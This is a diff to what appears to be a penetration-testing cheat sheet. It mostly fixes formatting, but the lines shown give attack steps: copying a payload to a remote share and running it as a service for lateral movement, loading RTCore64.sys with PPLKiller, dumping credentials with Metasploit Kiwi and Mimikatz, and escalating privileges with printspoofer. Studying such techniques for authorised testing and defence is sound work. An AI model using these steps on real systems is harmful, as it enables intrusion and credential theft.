@@ -56,6 +56,7 @@ Enjoy creating your own 🦠
 <br>
 
 # [Lateral_Movement](#lateral_movement-1)
+- [Fileless_Movement](#Fileless_Movement)
 - [SSH](#ssh)
 - [Autorun](#autorun)
 - [Chisel](#Chisel)
@@ -78,8 +79,8 @@ Enjoy creating your own 🦠
 
 # [MimiKatz](#Mimikatz)
 - [Disable LSA](#Disable_LSA_and_Dump)
--  [Offline Dump](#Offline_Dump)
--  [Minidump](#MiniDump)
+- [Offline Dump](#Offline_Dump)
+- [Minidump](#MiniDump)
 
 <br>
 
@@ -1387,11 +1388,13 @@ $method.Invoke(0, $null)
 
 <br>
 
-## Fileless_Movvement
+## Fileless_Movement
 
+```
 - [lateralmovement](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Fileless%20Lateral%20Movement)
 - copy .\payload.exe \\server\share$\windows\tasks
 - latmov.exe <server> senorservice "c:\windows\tasks\payload.exe"
+```
 
 ## SSH
 
@@ -1419,7 +1422,7 @@ proxychains4 nmap 192.168.1.0/24
 
 ### autorun
 
-```bash
+```
 post/multi/manage/autoroute
 set session x
 run
@@ -1552,7 +1555,7 @@ tryme
 
 ### pplkiller
 
-```powershell
+```
 1. upload the driver RTCore64.sys
 2. upload PPLKiller.exe
 3. PPLKiller.exe /installDriver
@@ -1567,7 +1570,7 @@ tryme
 
 ### Metasploit Kiwi
 
-```powershell
+```
 1. While in meterpreter 'load kiwi'
 2. creds_all
 *Need system priv, Can be done using 'printspoofer.exe -i -c powershell.exe'....impersonate has to be enabled.
